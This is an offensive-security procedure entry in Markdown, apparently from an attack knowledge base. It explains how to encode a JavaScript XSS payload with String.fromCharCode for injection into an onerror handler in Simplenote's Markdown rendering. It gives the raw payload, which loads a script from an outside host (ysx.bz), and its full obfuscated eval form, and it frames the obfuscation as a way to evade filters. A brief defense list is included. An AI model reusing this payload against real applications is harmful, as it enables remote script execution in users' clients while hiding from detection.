---
id: proc-encode-js-payload
tags:
  - xss
  - obfuscation
  - javascript
type: procedure
tools:
  - '[[tools/JavaScript-Eval-Encoder]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Desktop
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:23:36.310Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Encode-JavaScript-Payload-for-XSS-Injection

## Summary

This procedure encodes a JavaScript payload using String.fromCharCode to obfuscate it for injection into an XSS onerror handler, preventing basic detection while ensuring eval execution.

## Description

For the Simplenote attack, the payload creates and appends a script element sourcing the external malicious JS. Encoding via fromCharCode converts the string to ASCII values, which eval then reconstructs. This targets the Markdown parser's insufficient HTML sanitization.

## Requirements

1. Access to a JavaScript encoder tool
2. The raw JS payload to encode
3. Knowledge of the target injection point (onerror)

## Defense

Defensive measures and detection strategies:

- Sanitize all HTML attributes in Markdown parsers
- Disable or restrict eval in client-side JS
- Monitor for unusual string.fromCharCode usage in web traffic

## Objectives

1. Obfuscate JS to evade filters
2. Ensure payload executes on eval
3. Integrate into HTML injection

## Instructions

### Step 1: Prepare Raw Payload

**Context**: Define the JS that loads the external script.

Raw payload:
```javascript
var js = document.createElement("script"); js.type = "text/javascript"; js.src = "http://ysx.bz/hackerone-electron.js"; document.body.appendChild(js);
```

### Step 2: Encode with Tool

**Context**: Use the encoder to convert to fromCharCode.

**Tool** ([[tools/JavaScript-Eval-Encoder]]):
Input the raw payload into the online encoder at https://www.martineve.com/2007/05/15/javascript-eval-string-fromcharcode-encoder/.

> Output: eval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99,116,114,111,110,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,106,115,41,59)). Test by pasting into console; expected: script element appended.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/JavaScript-Eval-Encoder]]

## Tags

- xss
- obfuscation
